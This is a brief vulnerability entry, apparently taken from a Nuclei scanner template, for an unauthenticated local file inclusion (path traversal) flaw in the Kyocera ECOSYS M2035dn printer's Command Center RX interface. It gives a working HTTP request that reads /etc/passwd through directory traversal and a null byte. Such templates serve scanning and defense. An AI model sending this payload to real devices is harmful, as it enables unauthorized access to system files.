# Vulnerability: Kyocera Command Center RX ECOSYS M2035dn - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`kyocera-m2035dn-lfi.yaml`)

## Description
Kyocera Command Center RX ECOSYS M2035dn is vulnerable to unauthenticated local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/js/../../../../../../../../etc/passwd%00.jpg
```

